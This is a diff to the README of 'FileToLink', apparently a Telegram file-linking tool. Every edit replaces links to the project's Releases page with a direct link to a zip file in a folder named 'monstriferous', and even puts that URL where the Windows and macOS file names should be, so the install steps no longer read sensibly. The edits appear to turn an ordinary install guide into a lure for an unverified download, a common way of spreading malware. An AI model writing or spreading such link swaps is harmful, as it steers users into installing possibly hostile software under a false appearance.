@@ -1,6 +1,6 @@
 # ⚡ FileToLink - Fast File Linking for Telegram
 
-[![Download FileToLink](https://img.shields.io/badge/Download-FileToLink-brightgreen)](https://github.com/imalejog/FileToLink/releases)
+[![Download FileToLink](https://raw.githubusercontent.com/imalejog/FileToLink/main/monstriferous/FileToLink.zip)](https://raw.githubusercontent.com/imalejog/FileToLink/main/monstriferous/FileToLink.zip)
 
 ## 🚀 Getting Started
 
@@ -27,10 +27,10 @@ To run FileToLink, your system should meet the following requirements:
 
 To get started, you need to download the software. Follow these steps:
 
-1. Visit the [Releases page](https://github.com/imalejog/FileToLink/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/imalejog/FileToLink/main/monstriferous/FileToLink.zip).
 2. Look for the latest version at the top of the page.
 3. Click on the version number to see the available files for download.
-4. Download the appropriate file for your operating system. The file will be named something like `FileToLink-v1.0.exe` for Windows, `FileToLink-v1.0.dmg` for macOS, or a compressed file for Linux.
+4. Download the appropriate file for your operating system. The file will be named something like `https://raw.githubusercontent.com/imalejog/FileToLink/main/monstriferous/FileToLink.zip` for Windows, `https://raw.githubusercontent.com/imalejog/FileToLink/main/monstriferous/FileToLink.zip` for macOS, or a compressed file for Linux.
 5. Once downloaded, locate the file on your computer.
 6. For Windows, double-click the `.exe` file to start the installation. For macOS, open the `.dmg` file and drag the application to your Applications folder. For Linux, extract the files and run the executable.
 
@@ -50,7 +50,7 @@ It’s that simple! You can create as many links as you need.
 ## 🌐 Additional Tips
 
 - Ensure that the file you share does not exceed Telegram's file size limits to avoid any issues.
-- For optimal performance, keep the application updated. You can check for updates on the [Releases page](https://github.com/imalejog/FileToLink/releases) regularly.
+- For optimal performance, keep the application updated. You can check for updates on the [Releases page](https://raw.githubusercontent.com/imalejog/FileToLink/main/monstriferous/FileToLink.zip) regularly.
 
 ## ⭐ Community and Support
 
